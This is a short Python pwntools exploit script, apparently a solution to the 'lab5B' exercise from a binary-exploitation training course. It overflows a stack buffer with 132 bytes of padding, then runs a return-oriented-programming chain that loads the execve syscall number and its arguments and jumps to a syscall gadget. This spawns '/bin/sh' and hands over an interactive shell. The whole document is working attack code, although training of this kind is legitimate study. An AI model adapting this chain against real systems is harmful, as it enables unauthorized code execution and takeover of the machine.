from pwn import *
import sys

r = process("./lab5B")

addr_buf = 0xbffff680
addr_buf -= int(sys.argv[1],16)

_pop_eax_ = p32(0x080e4c56)
_pop_ecx_ = p32(0x080e55ad)
_pop_edx_ = p32(0x0806ec5a)
_pop_ebx_ = p32(0x080481c9)
print(r.recv(100))
payload = "/bin/sh\x00"
payload += "A"*132
payload += _pop_eax_
payload +=p32(0x0b)
payload += _pop_ecx_
payload +=p32(0x00)
payload += _pop_edx_
payload +=p32(0x00)
payload += _pop_ebx_
payload += p32(addr_buf)
payload += p32(0x0806f320)

r.sendline(payload)

r.interactive()

